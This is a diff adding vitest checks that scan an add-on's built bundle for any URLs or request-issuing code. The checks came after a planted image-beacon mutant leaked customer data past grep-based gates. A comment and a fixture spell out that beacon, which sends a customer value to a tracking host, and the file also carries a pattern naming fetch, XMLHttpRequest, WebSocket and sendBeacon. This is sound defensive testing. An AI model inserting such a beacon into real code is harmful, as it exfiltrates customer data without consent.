@@ -37,6 +37,8 @@ import { beforeAll, describe, expect, it } from "vitest";
 
 import manifest from "../manifest.json" with { type: "json" };
 import { OUTPUT } from "../vite.config.ts";
+import { foreignImportsIn, offendingAddresses, sendersIn } from "@adminium/add-on-host/testing";
+
 import { buildForReal, DIST, ROOT } from "./testing/build.ts";
 import { bannedHitsIn, tieringHitsIn } from "./testing/lexicon.ts";
 
@@ -150,5 +152,55 @@ describe("the vocabulary ban, over built output", () => {
       }
     }
     expect(offenders).toEqual([]);
+  });
+});
+
+/**
+ * D11 OVER THE ARTEFACT, WHICH IS WHERE THE MUTANT ACTUALLY REACHED.
+ *
+ * This package's `sources.test.ts` used to hold "no real third-party call" as a
+ * grep for four spellings. A verifier put an image beacon into
+ * `ui/DispatchAction.tsx` —
+ *
+ *     const img = new Image(); img.src = "https://…/p?c=" + customer;
+ *
+ * — and every gate in three repos stayed green, all the way into a live host
+ * app's bundle. The sources are checked there; these are the bytes, which is
+ * the last place it can be caught and the only place a folded constant, a
+ * dependency's own code or a surviving comment shows up.
+ *
+ * NO ADDRESS AT ALL is the right allow-list for this add-on. It declares no
+ * `network` block: the one way out is the `HttpClient` the host injects, so the
+ * first URL to appear in these bytes is a finding whatever it points at.
+ * That includes a URL written in a COMMENT — this build keeps them, and a
+ * comment in `dist/` is a byte in `dist/`.
+ */
+describe("nothing in the artefact can reach a host we do not control (24 D11)", () => {
+  it("names no address at all, in any emitted file", () => {
+    const offences = built().flatMap((file) =>
+      offendingAddresses(readFileSync(file, "utf8"), []).map(
+        (url) => `${relative(file)} → ${url}`,
+      ),
+    );
+    expect(offences).toEqual([]);
+  });
+
+  it("carries nothing that can issue a request", () => {
+    const offences = built().flatMap((file) => [
+      ...sendersIn(readFileSync(file, "utf8")).map((means) => `${relative(file)} → ${means}`),
+      ...foreignImportsIn(readFileSync(file, "utf8")).map((spec) => `${relative(file)} → ${spec}`),
+    ]);
+    expect(offences).toEqual([]);
+  });
+
+  it("reads something, so an empty result is never a pass", () => {
+    expect(built().length).toBeGreaterThan(1);
+  });
+
+  it("would report the mutant, which held none of the four words", () => {
+    const mutant = 'const img=new Image();img.src="https://tracking.example-analytics.net/p?c="+c;';
+    expect(offendingAddresses(mutant, [])).toEqual(["https://tracking.example-analytics.net/p?c="]);
+    expect(sendersIn(mutant)).toEqual(["new Image — an image beacon"]);
+    expect(/fetch\(|XMLHttpRequest|new WebSocket|navigator\.sendBeacon/.test(mutant)).toBe(false);
   });
 });
